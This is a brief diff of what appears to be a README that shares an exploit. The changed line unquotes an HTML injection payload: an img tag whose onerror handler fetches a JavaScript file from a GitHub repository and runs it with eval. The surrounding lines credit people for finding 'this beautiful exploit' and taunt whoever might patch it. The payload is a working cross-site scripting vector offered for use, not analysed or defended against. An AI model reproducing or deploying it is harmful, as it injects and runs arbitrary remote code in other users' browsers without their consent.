@@ -5,5 +5,5 @@ NOTE: I do not consent to your dumb self, if you get this exploit gone. don't co
 
 Also thanks to ohonbob for finding this beautiful exploit, and Amurkess for the Idea.
 
-'<img src=# onerror='fetch("https://github.com/CharlieIsInsane/CharlieSearch/raw/main/Search%20engine.js").then(r=>r.text()).then(c=>eval(c))'>'
+<img src=# onerror='fetch("https://github.com/CharlieIsInsane/CharlieSearch/raw/main/Search%20engine.js").then(r=>r.text()).then(c=>eval(c))'>
 
